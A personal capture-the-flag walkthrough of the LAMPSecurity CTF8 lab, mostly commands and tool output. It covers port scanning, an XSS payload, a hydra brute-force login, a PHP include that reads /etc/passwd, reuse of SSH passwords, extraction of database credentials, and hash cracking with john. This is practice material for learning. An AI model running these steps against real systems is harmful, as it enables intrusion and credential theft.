@@ -1,0 +1,671 @@
+LAMP CTF8
+time taken: 4 hours
+
+nmap:
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-07-23 17:55 MDT
+Nmap scan report for ctf01.root-me.org (212.129.28.18)
+Host is up (0.10s latency).
+Not shown: 986 closed ports
+PORT     STATE    SERVICE      VERSION
+21/tcp   open     ftp          vsftpd 2.0.5
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    2 0        0            4096 Jun 05  2013 pub
+22/tcp   open     ssh          OpenSSH 4.3 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 5e:ca:64:f0:7f:d2:1a:a2:86:c6:1f:c2:2a:b3:6b:27 (DSA)
+|_  2048 a3:39:2d:9f:66:96:0d:82:ad:52:1f:a1:dc:b1:f1:54 (RSA)
+80/tcp   open     http         Apache httpd 2.2.3 ((CentOS))
+|_http-favicon: Drupal CMS
+| http-git: 
+|   212.129.28.18:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|_    Last commit message: initial commit 
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /sites/ /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /install.php /INSTALL.txt /LICENSE.txt 
+|_/MAINTAINERS.txt
+|_http-server-header: Apache/2.2.3 (CentOS)
+|_http-title: LAMPSecurity Research
+110/tcp  open     pop3         Dovecot pop3d
+|_pop3-capabilities: SASL(PLAIN) TOP USER PIPELINING STLS RESP-CODES CAPA UIDL
+| ssl-cert: Subject: commonName=imap.example.com
+| Not valid before: 2013-05-29T19:38:44
+|_Not valid after:  2014-05-29T19:38:44
+|_ssl-date: 2017-07-23T23:55:52+00:00; +1s from scanner time.
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|_    SSL2_RC4_128_EXPORT40_WITH_MD5
+111/tcp  open     rpcbind      2 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100024  1            776/udp  status
+|_  100024  1            779/tcp  status
+139/tcp  open     netbios-ssn?
+143/tcp  open     imap         Dovecot imapd
+|_imap-capabilities: completed SASL-IR Capability OK IMAP4rev1 LITERAL+ SORT STARTTLS CHILDREN NAMESPACE THREAD=REFERENCES LOGIN-REFERRALS UNSELECT IDLE MULTIAPPEND AUTH=PLAINA0001
+| ssl-cert: Subject: commonName=imap.example.com
+| Not valid before: 2013-05-29T19:38:44
+|_Not valid after:  2014-05-29T19:38:44
+|_ssl-date: 2017-07-23T23:55:55+00:00; +1s from scanner time.
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|_    SSL2_RC4_128_EXPORT40_WITH_MD5
+443/tcp  open     ssl/http     Apache httpd 2.2.3 ((CentOS))
+| http-git: 
+|   212.129.28.18:443/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|_    Last commit message: initial commit 
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /sites/ /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /install.php /INSTALL.txt /LICENSE.txt 
+|_/MAINTAINERS.txt
+|_http-server-header: Apache/2.2.3 (CentOS)
+|_http-title: LAMPSecurity Research
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+| Not valid before: 2013-05-29T19:38:35
+|_Not valid after:  2014-05-29T19:38:35
+|_ssl-date: 2017-07-23T23:55:54+00:00; +1s from scanner time.
+445/tcp  open     netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+465/tcp  filtered smtps
+993/tcp  open     ssl/imap     Dovecot imapd
+| ssl-cert: Subject: commonName=imap.example.com
+| Not valid before: 2013-05-29T19:38:44
+|_Not valid after:  2014-05-29T19:38:44
+|_ssl-date: 2017-07-23T23:55:51+00:00; +1s from scanner time.
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|_    SSL2_RC4_128_EXPORT40_WITH_MD5
+995/tcp  open     ssl/pop3     Dovecot pop3d
+| ssl-cert: Subject: commonName=imap.example.com
+| Not valid before: 2013-05-29T19:38:44
+|_Not valid after:  2014-05-29T19:38:44
+|_ssl-date: 2017-07-23T23:55:55+00:00; +1s from scanner time.
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|_    SSL2_RC4_128_EXPORT40_WITH_MD5
+2525/tcp filtered ms-v-worlds
+3306/tcp open     mysql        MySQL (unauthorized)
+Device type: general purpose|printer|bridge
+Running (JUST GUESSING): QEMU (94%), GNU Hurd (87%), HP embedded (86%), Minolta embedded (86%), NEC embedded (86%), Konica Minolta embedded (86%), Linux (85%), Oracle Virtualbox (85%)
+OS CPE: cpe:/a:qemu:qemu cpe:/o:gnu:hurd cpe:/h:konicaminolta:7035 cpe:/o:linux:linux_kernel:2.6.18 cpe:/o:oracle:virtualbox
+Aggressive OS guesses: QEMU user mode network gateway (94%), GNU Hurd 0.3 (87%), HP 9100c Digital Sender printer (J3113A) (86%), Minolta Di550 laser printer (86%), NEC SuperScript printer (86%), Konica Minolta 7035 printer (86%), Linux 2.6.18 (CentOS 5, x86_64, SMP) (85%), Oracle Virtualbox (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Unix
+
+Host script results:
+|_nbstat: NetBIOS name: LAMPSEC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT     ADDRESS
+1   0.13 ms 10.0.2.2
+2   0.33 ms ctf01.root-me.org (212.129.28.18)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 50.49 seconds
+
+
+
+drupal users:
+[*] Done. 22 usernames found...
+[+] Found User: Anonymous
+[+] Found User: admin
+[+] Found User: ady
+[+] Found User: Barbara
+[+] Found User: Dan
+[+] Found User: Gene
+[+] Found User: George
+[+] Found User: Harvey
+[+] Found User: Jeff
+[+] Found User: Jerome
+[+] Found User: Jim
+[+] Found User: John
+[+] Found User: Johnathan
+[+] Found User: Juan
+[+] Found User: Michael
+[+] Found User: Sally
+[+] Found User: Sherry
+[+] Found User: Stacey
+[+] Found User: Steve
+[+] Found User: Susan
+[+] Found User: Tom
+[+] Found User: Xavier
+[*] Usernames stored in: /root/.msf4/loot/20170523211837_default_212.129.28.18_drupal_user_428622.txt
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+try ftp:
+
+nc 212.129.28.18 21
+220 (vsFTPd 2.0.5)
+USER Anonymous
+331 Please specify the password.
+PASS 
+230 Login successful.
+
+
+
+root@kali:~/ctf_april/lamp_8# uniscan -u http://ctf01.root-me.org -qweds
+
+===================================================================================================
+| Domain: http://ctf01.root-me.org/
+| Server: Apache/2.2.3 (CentOS)
+| IP: 212.129.28.18
+===================================================================================================
+|
+| Directory check:
+| [+] CODE: 200 URL: http://ctf01.root-me.org/contact/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/icons/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/includes/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/mail/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/modules/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/node/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/profiles/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/sales/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/scripts/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/search/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/sites/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/support/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/themes/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/tracker/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/user/
+===================================================================================================
+|                                                                                                   
+| File check:
+| [+] CODE: 200 URL: http://ctf01.root-me.org/CHANGELOG.txt
+| [+] CODE: 200 URL: http://ctf01.root-me.org/error/HTTP_NOT_FOUND.html.var
+| [+] CODE: 200 URL: http://ctf01.root-me.org/index.php
+| [+] CODE: 200 URL: http://ctf01.root-me.org/INSTALL.mysql.txt
+| [+] CODE: 200 URL: http://ctf01.root-me.org/INSTALL.pgsql.txt
+| [+] CODE: 200 URL: http://ctf01.root-me.org/INSTALL.txt
+| [+] CODE: 200 URL: http://ctf01.root-me.org/install.php
+| [+] CODE: 200 URL: http://ctf01.root-me.org/LICENSE.txt
+| [+] CODE: 200 URL: http://ctf01.root-me.org/mail/src/read_body.php
+| [+] CODE: 200 URL: http://ctf01.root-me.org/MAINTAINERS.txt
+| [+] CODE: 200 URL: http://ctf01.root-me.org/phpinfo.php
+| [+] CODE: 200 URL: http://ctf01.root-me.org/robots.txt
+| [+] CODE: 200 URL: http://ctf01.root-me.org/search/sqlqhit.asp
+| [+] CODE: 200 URL: http://ctf01.root-me.org/search/SQLQHit.asp
+| [+] CODE: 200 URL: http://ctf01.root-me.org/search/htx/SQLQHit.asp
+| [+] CODE: 200 URL: http://ctf01.root-me.org/search/htx/sqlqhit.asp
+| [+] CODE: 200 URL: http://ctf01.root-me.org/sites/default/settings.php
+| [+] CODE: 200 URL: http://ctf01.root-me.org/support/messages
+| [+] CODE: 200 URL: http://ctf01.root-me.org/UPGRADE.txt
+| [+] CODE: 200 URL: http://ctf01.root-me.org/update.php
+| [+] CODE: 200 URL: http://ctf01.root-me.org/webmail/src/read_body.php
+| [+] CODE: 200 URL: http://ctf01.root-me.org/webmail/src/configtest.php
+| [+] CODE: 200 URL: http://ctf01.root-me.org/xmlrpc.php
+===================================================================================================
+|
+| Check robots.txt:
+| [+] #flag#4db00563d4181dc8d1dfd3b5cd6dc708
+| [+] # $Id: robots.txt,v 1.9.2.1 2008/12/10 20:12:19 goba Exp $
+| [+] #
+| [+] # robots.txt
+| [+] #
+| [+] # This file is to prevent the crawling and indexing of certain parts
+| [+] # of your site by web crawlers and spiders run by sites like Yahoo!
+| [+] # and Google. By telling these "robots" where not to go on your site,
+| [+] # you save bandwidth and server resources.
+| [+] #
+| [+] # This file will be ignored unless it is at the root of your host:
+| [+] # Used:    http://example.com/robots.txt
+| [+] # Ignored: http://example.com/site/robots.txt
+| [+] #
+| [+] # For more information about the robots.txt standard, see:
+| [+] # http://www.robotstxt.org/wc/robots.html
+| [+] #
+| [+] # For syntax checking, see:
+| [+] # http://www.sxw.org.uk/computing/robots/check.html
+| [+] 
+| [+] User-agent: *
+| [+] Crawl-delay: 10
+| [+] # Directories
+| [+] Disallow: /includes/
+| [+] Disallow: /misc/
+| [+] Disallow: /modules/
+| [+] Disallow: /profiles/
+| [+] Disallow: /scripts/
+| [+] Disallow: /sites/
+| [+] Disallow: /themes/
+| [+] # Files
+| [+] Disallow: /CHANGELOG.txt
+| [+] Disallow: /cron.php
+| [+] Disallow: /INSTALL.mysql.txt
+| [+] Disallow: /INSTALL.pgsql.txt
+| [+] Disallow: /install.php
+| [+] Disallow: /INSTALL.txt
+| [+] Disallow: /LICENSE.txt
+| [+] Disallow: /MAINTAINERS.txt
+| [+] Disallow: /update.php
+| [+] Disallow: /UPGRADE.txt
+| [+] Disallow: /xmlrpc.php
+| [+] # Paths (clean URLs)
+| [+] Disallow: /admin/
+| [+] Disallow: /comment/reply/
+| [+] Disallow: /contact/
+| [+] Disallow: /logout/
+| [+] Disallow: /node/add/
+| [+] Disallow: /search/
+| [+] Disallow: /user/register/
+| [+] Disallow: /user/password/
+| [+] Disallow: /user/login/
+| [+] # Paths (no clean URLs)
+| [+] Disallow: /?q=admin/
+| [+] Disallow: /?q=comment/reply/
+| [+] Disallow: /?q=contact/
+| [+] Disallow: /?q=logout/
+| [+] Disallow: /?q=node/add/
+| [+] Disallow: /?q=search/
+| [+] Disallow: /?q=user/password/
+| [+] Disallow: /?q=user/register/
+| [+] Disallow: /?q=user/login/
+|
+| Check sitemap.xml:
+===================================================================================================
+|
+| Crawler Started:
+| Plugin name: Upload Form Detect v.1.1 Loaded.
+| Plugin name: Code Disclosure v.1.1 Loaded.
+| Plugin name: FCKeditor upload test v.1 Loaded.
+| Plugin name: Timthumb <= 1.32 vulnerability v.1 Loaded.
+| Plugin name: phpinfo() Disclosure v.1 Loaded.
+| Plugin name: External Host Detect v.1.2 Loaded.
+| Plugin name: Web Backdoor Disclosure v.1.1 Loaded.
+| Plugin name: E-mail Detection v.1.1 Loaded.
+| [+] Crawling finished, 1216 URL's found!
+|
+| File Upload Forms:
+|
+| Source Code Disclosure:
+| [+] Source Code Found: http://ctf01.root-me.org//themes/openg/readme.txt
+| [+] Source Code Found: http://ctf01.root-me.org/themes/openg/readme.txt
+|
+| FCKeditor File Upload:
+|
+| Timthumb:
+|
+| PHPinfo() Disclosure:
+| [+] phpinfo() page: http://ctf01.root-me.org/phpinfo.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000
+| [+] phpinfo() page: http://ctf01.root-me.org/phpinfo.php
+| 	System: Linux localhost.localdomain 2.6.18-128.el5 #1 SMP Wed Jan 21 10:44:23 EST 2009 i686 
+| 	Apache Version: Apache/2.2.3 (CentOS) 
+| 	Server Administrator: root@localhost 
+| 	User/Group: apache(48)/48 
+| 	Server Root: /etc/httpd 
+| 	DOCUMENT_ROOT: /var/www/html/drupal 
+| 	SCRIPT_FILENAME: /var/www/html/drupal/phpinfo.php 
+| 	allow_url_fopen: On
+| 	disable_functions: <i>no value</i>
+| 	safe_mode: Off
+| 	safe_mode_exec_dir: <i>no value</i>
+|
+| External hosts:
+| [+] External Host Found: http://www.drupal.org
+| [+] External Host Found: http://www.alistapart.com
+| [+] External Host Found: http://www.proxiss.de
+| [+] External Host Found: http://api.drupal.org
+| [+] External Host Found: http://views.doc.logrus.com
+| [+] External Host Found: http://drupal.org
+|
+| Web Backdoors:
+|
+| E-mails:
+| [+] E-mail Found: jalderman@localhost.localdomain
+| [+] E-mail Found: chx@mail.tvnet.hu
+| [+] E-mail Found: speck@blkmtn.org
+| [+] E-mail Found: jstone@localhost.localdomain
+| [+] E-mail Found: joon@dvessel.com
+| [+] E-mail Found: goba@php.net
+| [+] E-mail Found: drupal@2bits.com
+| [+] E-mail Found: license@php.net
+| [+] E-mail Found: sloreman@localhost.localdomain
+| [+] E-mail Found: dries@drupal.org
+| [+] E-mail Found: gerhard@killesreiter.de
+| [+] E-mail Found: jgoldman@localhost.localdomain
+| [+] E-mail Found: hdeelstra@gmail.com
+| [+] E-mail Found: sales@localhost.localdomain
+| [+] E-mail Found: drupal@asitis.org
+| [+] E-mail Found: merlin@logrus.com
+| [+] E-mail Found: sammys-drupal@synerger.com
+| [+] E-mail Found: spinkton@localhost.localdomain
+| [+] E-mail Found: gprune@localhost.localdomain
+| [+] E-mail Found: jeremy@kerneltrap.com
+| [+] E-mail Found: xbruce@localhost.localdomain
+| [+] E-mail Found: tmaloney@localhost.localdomain
+| [+] E-mail Found: jgrimes@localhost.localdomain
+| [+] E-mail Found: bdio@localhost.localdomain
+| [+] E-mail Found: walkah@walkah.net
+| [+] E-mail Found: jharraway@localhost.localdomain
+| [+] E-mail Found: sswiney@localhost.localdomain
+| [+] E-mail Found: user@domain.com
+| [+] E-mail Found: gconnor@localhost.localdomain
+| [+] E-mail Found: sholden@localhost.localdomain
+| [+] E-mail Found: hplink@localhost.localdomain
+| [+] E-mail Found: unconed@drupal.org
+| [+] E-mail Found: mswanson@localhost.localdomain
+| [+] E-mail Found: weitzman@tejasa.com
+| [+] E-mail Found: shunter@localhost.localdomain
+| [+] E-mail Found: jingersol@localhost.localdomain
+| [+] E-mail Found: dhart@localhost.localdomain
+|
+| Ignored Files: 
+| http://ctf01.root-me.org/modules/token-6.x-1.10.tar.gz
+| http://ctf01.root-me.org/themes/itworld-6.x-1.x-dev.tar.gz
+| http://ctf01.root-me.org//modules/views_attach-6.x-1.1.tar.gz
+| http://ctf01.root-me.org/modules/system/system-menus.css?0
+| http://ctf01.root-me.org/modules/system/system.css?0
+| http://ctf01.root-me.org/modules/system/defaults.css?T
+| http://ctf01.root-me.org/modules/views_attach-6.x-1.1.tar.gz
+| http://ctf01.root-me.org/modules/search/search.css?T
+| http://ctf01.root-me.org//themes/itworld-6.x-1.x-dev.tar.gz
+| http://ctf01.root-me.org//modules/admin_menu-6.x-1.0.tar.gz
+| http://ctf01.root-me.org/modules/system/system-menus.css?T
+| http://ctf01.root-me.org/modules/system/system.css?T
+| http://ctf01.root-me.org/modules/admin_menu-6.x-1.0.tar.gz
+| http://ctf01.root-me.org/modules/system/maintenance.css?T
+| http://ctf01.root-me.org/modules/cck-6.x-2.0.tar.gz
+| http://ctf01.root-me.org/themes/garland/style.css?T
+| http://ctf01.root-me.org/themes/garland/minnelli/minnelli.css?0
+| http://ctf01.root-me.org//modules/cck-6.x-2.0.tar.gz
+| http://ctf01.root-me.org/themes/algaglas-6.x-1.0.tar.gz
+| http://ctf01.root-me.org/themes/garland/style.css?0
+| http://ctf01.root-me.org//modules/views-6.x-2.0.tar.gz
+| http://ctf01.root-me.org//modules/token-6.x-1.10.tar.gz
+| http://ctf01.root-me.org/modules/system/defaults.css?0
+| http://ctf01.root-me.org//modules/pathauto-6.x-1.0.tar.gz
+| http://ctf01.root-me.org/modules/dblog/dblog.css?T
+| http://ctf01.root-me.org/modules/pathauto-6.x-1.0.tar.gz
+| http://ctf01.root-me.org/modules/views-6.x-2.0.tar.gz
+| http://ctf01.root-me.org//themes/openg-6.x-2.0.tar.gz
+| http://ctf01.root-me.org/themes/openg-6.x-2.0.tar.gz
+| http://ctf01.root-me.org/rss.xml
+| http://ctf01.root-me.org//themes/algaglas-6.x-1.0.tar.gz
+| http://ctf01.root-me.org/themes/garland/minnelli/minnelli.css?T
+| http://ctf01.root-me.org/modules/system/maintenance.css?0
+| http://ctf01.root-me.org/themes/garland/print.css?T
+| http://ctf01.root-me.org/modules/tracker/tracker.css?T
+| http://ctf01.root-me.org/themes/garland/print.css?0
+===================================================================================================
+| Dynamic tests:
+| Plugin name: Learning New Directories v.1.2 Loaded.
+| Plugin name: FCKedior tests v.1.1 Loaded.
+| Plugin name: Timthumb <= 1.32 vulnerability v.1 Loaded.
+| Plugin name: Find Backup Files v.1.2 Loaded.
+| Plugin name: Blind SQL-injection tests v.1.3 Loaded.
+| Plugin name: Local File Include tests v.1.1 Loaded.
+| Plugin name: PHP CGI Argument Injection v.1.1 Loaded.
+| Plugin name: Remote Command Execution tests v.1.1 Loaded.
+| Plugin name: Remote File Include tests v.1.2 Loaded.
+| Plugin name: SQL-injection tests v.1.2 Loaded.
+| Plugin name: Cross-Site Scripting tests v.1.2 Loaded.
+| Plugin name: Web Shell Finder v.1.3 Loaded.
+| [+] 25 New directories added
+|                                                                                                   
+|                                                                                                   
+| FCKeditor tests:
+|                                                                                                   
+|                                                                                                   
+| Timthumb < 1.33 vulnerability:
+|                                                                                                   
+|                                                                                                   
+| Backup Files:
+| [+] CODE: 200 URL: http://ctf01.root-me.org/taxonomy/term/3/0.bkp
+| [+] CODE: 200 URL: http://ctf01.root-me.org/taxonomy/term/3/0~
+| [+] CODE: 200 URL: http://ctf01.root-me.org/taxonomy/term/2/0~
+| [+] CODE: 200 URL: http://ctf01.root-me.org/taxonomy/term/4/0.bkp
+| [+] CODE: 200 URL: http://ctf01.root-me.org/taxonomy/term/2/0.bkp
+| [+] CODE: 200 URL: http://ctf01.root-me.org/taxonomy/term/4/0~
+| [+] CODE: 200 URL: http://ctf01.root-me.org/taxonomy/term/5/0.bkp
+| [+] CODE: 200 URL: http://ctf01.root-me.org/taxonomy/term/1/0.bkp
+| [+] CODE: 200 URL: http://ctf01.root-me.org/taxonomy/term/5/0~
+| [+] CODE: 200 URL: http://ctf01.root-me.org/taxonomy/term/1/0~
+|                                                                                                   
+|                                                                                                   
+| Blind SQL Injection:
+|                                                                                                   
+|                                                                                                   
+| Local File Include:
+|                                                                                                   
+|                                                                                                   
+| PHP CGI Argument Injection:
+|                                                                                                   
+|                                                                                                   
+| Remote Command Execution:
+       
+
+
+in john --> add comment,
+
+<script>alert(document.cookie);</script> results in XSS.
+
+barbara seems to be the admin...
+
+not sure how to get a shell or anything like that right now, so last resort is 
+bruteforcing:
+
+try bruteforcing login:
+
+ctf_shit/lamp_8# hydra ctf01.root-me.org http-form-post "/user:name=^USER^&pass=^PASS^:Sorry, unrecognized username or password. Have you forgotten your password?" -l barbara -P /media/sf_shared_VM/passwords_john.txt -t 10 -V 
+Hydra v8.3 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2017-07-23 20:00:10
+[ATTEMPT] target ctf01.root-me.org - login "barbara" - pass "12345" - 1 of 3135 [child 0] (0/0)
+[ATTEMPT] target ctf01.root-me.org - login "barbara" - pass "abc123" - 2 of 3135 [child 1] (0/0)
+.
+[80][http-post-form] host: ctf01.root-me.org   login: barbara   password: passw0rd
+1 of 1 target successfully completed, 1 valid password found
+
+well alrighy then
+
+trying to create a php-reverse-shell.php, or wso.php, did not work...
+
+
+but
+
+editing a page to include this php code:
+
+<?php include('/etc/passwd');?>
+
+
+
+divulged /etc/passwd:
+
+
+root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin news:x:9:13:news:/etc/news: uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin gopher:x:13:30:gopher:/var/gopher:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin apache:x:48:48:Apache:/var/www:/sbin/nologin rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin distcache:x:94:94:Distcache:/:/sbin/nologin nscd:x:28:28:NSCD Daemon:/:/sbin/nologin vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin webalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologin dovecot:x:97:97:dovecot:/usr/libexec/dovecot:/sbin/nologin squid:x:23:23::/var/spool/squid:/sbin/nologin mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash pcap:x:77:77::/var/arpwatch:/sbin/nologin ntp:x:38:38::/etc/ntp:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin haldaemon:x:68:68:HAL 
+
+daemon:/:/sbin/nologin avahi:x:70:70:Avahi daemon:/:/sbin/nologin named:x:25:25:Named:/var/named:/sbin/nologin avahi-autoipd:x:100:101:avahi-autoipd:/var/lib/avahi-autoipd:/sbin/nologin xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin sabayon:x:86:86:Sabayon user:/home/sabayon:/sbin/nologin jharraway:x:500:504::/home/jharraway:/bin/bash spinkton:x:501:505::/home/spinkton:/bin/bash sholden:x:502:506::/home/sholden:/bin/bash 
+
+bdio:x:503:507::/home/bdio:/bin/bash jalderman:x:504:508::/home/jalderman:/bin/bash <-USEFULL
+
+gconnor:x:505:509::/home/gconnor:/bin/bash sswiney:x:506:510::/home/sswiney:/bin/bash dhart:x:507:511::/home/dhart:/bin/bash gprune:x:508:512::/home/gprune:/bin/bash hplink:x:509:513::/home/hplink:/bin/bash jgrimes:x:510:514::/home/jgrimes:/bin/bash shunter:x:511:515::/home/shunter:/bin/bash jingersol:x:512:516::/home/jingersol:/bin/bash mswanson:x:513:517::/home/mswanson:/bin/bash jstone:x:514:518::/home/jstone:/bin/bash jgoldman:x:515:519::/home/jgoldman:/bin/bash tmaloney:x:516:520::/home/tmaloney:/bin/bash xbruce:x:517:521::/home/xbruce:/bin/bash sloreman:x:518:522:#flag#5b650c18929383074fea8870d857dd2e:/home/sloreman:/bin/bash
+
+bdio seems to be Barbara's email name too (bdio@localhost)
+
+try ssh with her Drupal password:
+
+root@kali:~/ctf_shit/lamp_8# ssh bdio@ctf01.root-me.org
+.
+.
+Welcome to LAMPSecurity Research SSH access!
+#flag#5e937c51b852e1ee90d42ddb5ccb8997
+
+Unauthorized access is expected...
+bdio@ctf01.root-me.org's password: 
+Last login: Wed Jun  5 19:46:47 2013 from 192.168.0.51
+#flag#motd-flag
+[bdio@localhost ~]$ id
+uid=503(bdio) gid=507(bdio) groups=501(marketing),507(bdio) context=user_u:system_r:unconfined_t
+
+yep. lesson here is don't reuse your passwords...
+
+barbara has no sudo rights, so no local privesc for this user...
+
+don't feel like wget (exploit) , gcc -o exploit exploit.c etc this time. 
+that approach is starting to feel cheap and boring..
+
+looking around the internet, according to http://techrappers.com/categories/drupal-6,
+it seems that settings.php may hold mysql credentials:
+
+[bdio@localhost ~]$ cat /var/www/html/drupal/sites/default/settings.php
+
+.
+.
+.
+
+$db_url = 'mysqli://root:JCGDYSBX7436nqtefdp994@localhost/drupal';
+$db_prefix = '';
+.
+.
+.
+
+[bdio@localhost ~]$ mysql -u root -p
+Enter password: JCGDYSBX7436nqtefdp994
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 3
+Server version: 5.0.45 Source distribution
+
+Type 'help;' or '\h' for help. Type '\c' to clear the buffer.
+
+mysql> 
+
+mysql> use drupal
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+
+
+mysql> show tables;
++-----------------------------+
+| Tables_in_drupal            |
++-----------------------------+
+| access                      | 
+| accesslog                   | 
+.
+.
+.
+| term_synonym                | 
+| upload                      | 
+| url_alias                   | 
+| url_alias_extra             | 
+| users                       | 
+| users_roles                 | 
+.
+.
+.
++-----------------------------+
+
+
+mysql> select mail, pass from users;
++---------------------------------+----------------------------------+
+| mail                            | pass                             |
++---------------------------------+----------------------------------+
+|                                 |                                  | 
+| spinkton@localhost              | 49265c16d1dff8acef3499bd889299d6 | 
+| bdio@localhost                  | bed128365216c019988915ed3add75fb | 
+| jharraway@localhost             | 2a5de0f53b1317f7e36afcdb6b5202a4 | 
+| spinkton@localhost.localdomain  | 08d15a4aef553492d8971cdd5198f314 | 
+| sholden@localhost.localdomain   | c3319d1016a802db86653bcfab871f4f | 
+| gconnor@localhost.localdomain   | 9b9e4bbd988954028a44710a50982576 | 
+| hplink@localhost.localdomain    | 7d29975b78825ea7c27f5c0281ea2fa4 | 
+| jgoldman@localhost.localdomain  | 518462cd3292a67c755521c1fb50c909 | 
+| jalderman@localhost.localdomain | 6dc523ebd2379d96cc0af32e2d224db0 | 
+| sswiney@localhost.localdomain   | 0d42223010b69cab86634bc359ed870b | 
+| dhart@localhost.localdomain     | 8f75ad3f04fc42f07c95e2f3d0ec3503 | 
+| gprune@localhost.localdomain    | ed2b1f468c5f915f3f1cf75d7068baae | 
+| jgrimes@localhost.localdomain   | ca594f739e257245f2be69eb546c1c04 | 
+| shunter@localhost.localdomain   | 85aca385eb555fb6a36a62915ddd8bc7 | 
+| jingersol@localhost.localdomain | 573152cc51de19df50e90b0e557db7fe | 
+| mswanson@localhost.localdomain  | c7a4476fc64b75ead800da9ea2b7d072 | 
+| jstone@localhost.localdomain    | 42248d4cb640a3fb5836571e254aee2b | 
+| tmaloney@localhost.localdomain  | 971dcf53e88e9268714d9d504753d347 | 
+| xbruce@localhost.localdomain    | 3005d829eb819341357bfddf541c175b | 
+| sloreman@localhost.localdomain  | 7a1c07ff60f9c07ffe8da34ecbf4edc2 | 
++---------------------------------+----------------------------------+
+
+
+password hashes?
+
+root@kali:~/ctf_shit/lamp_8# hashid
+49265c16d1dff8acef3499bd889299d6
+Analyzing '49265c16d1dff8acef3499bd889299d6'
+[+] MD2 
+[+] MD5 
+
+ok lets start cracking them:
+
+root@kali:~/ctf_shit/lamp_8# john --wordlist=/media/sf_shared_VM/rockyou.txt --format=Raw-MD5 heshes.txt 
+Using default input encoding: UTF-8
